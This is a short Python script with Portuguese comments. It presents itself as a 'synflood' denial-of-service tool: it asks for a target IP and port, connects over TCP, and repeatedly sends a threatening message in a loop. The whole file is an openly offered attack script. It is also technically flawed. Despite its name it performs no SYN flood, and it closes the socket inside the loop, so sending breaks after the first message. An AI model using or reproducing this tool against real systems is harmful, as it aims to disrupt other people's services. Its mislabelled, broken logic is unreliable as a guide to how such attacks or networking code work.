import socket
import random
import time
import sys


class synflood: 
    def synflood(self):

        # Cria o socket TCP
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Vamos atacar DOS em TCP")
        ip = input("Ip de destino:")
        port = input("E a porta a usar?")
        # Conecta ao servidor
        server_address = (ip, int(port))
        sock.connect(server_address)
        print("Estou ligado ao server")
        
        try:
            for i in range(1, 65000):
                # Envia uma mensagem
                message = b'Vais morrerrrrrrrrr!'
                sock.sendall(message)
                print("Enviei mensagem ao destino. Vamos aguardar")
                # Recebe a resposta
                data = sock.recv(1024)
                print('Recebido:', data.decode())
            # Fecha o socket
                sock.close()
        
        except KeyboardInterrupt:
            print("Ciclo interrompido ")
            sys.exit()
        except socket.gaierror:
            print("Nao consigo resolver o dominio")
            sys.exit()
        except socket.error:
            print("Nao consigo chegar ao servidor")
            sys.exit()

        